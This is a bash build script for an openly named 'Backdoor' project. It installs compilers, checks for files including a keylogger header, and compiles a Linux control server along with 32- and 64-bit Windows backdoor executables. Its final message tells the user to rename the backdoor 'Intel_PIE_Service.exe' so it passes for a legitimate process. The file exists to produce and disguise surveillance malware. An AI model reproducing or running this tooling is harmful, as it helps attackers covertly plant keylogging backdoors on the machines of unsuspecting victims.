#!/bin/bash

# functions
function missing_files {
    echo "------------------"
    echo "[Error] Missing $1"
    echo "[Fix] Get the files from https://github.com/chankruze/Backdoor"
    echo ""
    echo "Aborting...."
    exit 1
}

echo ""
echo "----------------------"
echo "  CHECKING COMPILERS  "
echo "----------------------"

# check for gcc & mingw32
echo "checking gcc..."
check_gcc=$(dpkg-query -W -f='${Status} ${Version}\n' gcc | cut -d" " -f2)

if [ "$check_gcc" != "ok" ]; then
    echo "installing gcc..."
    sudo apt install -y gcc
else
    dpkg-query -W -f='${Status} ${Version}\n' gcc
fi

echo "checking mingw-w64..."
check_mingw=$(dpkg-query -W -f='${Status} ${Version}\n' mingw-w64 | cut -d" " -f2)

if [ "$check_mingw" != "ok" ]; then
    echo "installing mingw-w64..."
    sudo apt install -y mingw-w64
else
    dpkg-query -W -f='${Status} ${Version}\n' mingw-w64
fi

echo ""
echo "----------------------"
echo "CHECKING PROJECT FILES"
echo "----------------------"
# files
libs=("common.h" "keylogger.h")
server_files=("server.c")
target_files=("backdoor.c")

# check for lib
if [ -d "libs" ]; then
    for i in ${!libs[@]}; do
        echo "looking for ${libs[$i]}..."
        if [ ! -f "libs/${libs[$i]}" ]; then
            missing_files ${libs[$i]}
        else
            echo "found ${libs[$i]}"
        fi
    done
else
    missing_files "libs"
fi

# check for src
if [ -d "src" ]; then
    # check for server
    if [ -d "src/server" ]; then
        for i in ${!server_files[@]}; do
            echo "looking for ${server_files[$i]}..."
            if [ ! -f "src/server/${server_files[$i]}" ]; then
                missing_files ${server_files[$i]}
            else
                echo "found ${server_files[$i]}"
            fi
        done
    else
        missing_files "server"
    fi

    # check for target
    if [ -d "src/target" ]; then
        for i in ${!target_files[@]}; do
            echo "looking for ${target_files[$i]}..."
            if [ ! -f "src/target/${target_files[$i]}" ]; then
                missing_files ${target_files[$i]}
            else
                echo "found ${target_files[$i]}"
            fi
        done
    else
        missing_files "target"

    fi
else
    missing_files "src"
fi

echo ""
echo "----------------------"
echo " STARTING COMPILATION "
echo "----------------------"

# check destination dir
if [ ! -d "dist" ]; then
    mkdir dist
else
    rm -f dist/*
fi
# temporary dir
mkdir .temp && cd .temp
# compile server.c
echo "Compiling Server..."
gcc ../src/server/server.c -o server.bin
# compile backdoor.c
echo "Compiling Backdoor for 32bit Windows [i686] ..."
i686-w64-mingw32-gcc ../src/target/backdoor.c -o Intel_PIE_Service_i686.exe -lwininet -lwsock32
echo "Compiling Backdoor for 64bit Windows [x86_64] ..."
x86_64-w64-mingw32-gcc ../src/target/backdoor.c -o Intel_PIE_Service_x86_64.exe -lwininet -lwsock32
# make server executable
chmod +x server.bin
cp *.bin *.exe ../dist/
# cleanup
cd .. && rm -rf .temp/
echo ""
echo "------------ BINARY INFO ------------"
echo "server bin [linux]: dist/server.bin"
echo "backdoor  [32 bit]: dist/Intel_PIE_Service_i686.exe"
echo "backdoor  [64 bit]: dist/Intel_PIE_Service_x86_64.exe"
echo ""
echo "According to target windows arch, select any one of backdoor exe
and rename it to  \"Intel_PIE_Service.exe\" to disguise in process name"
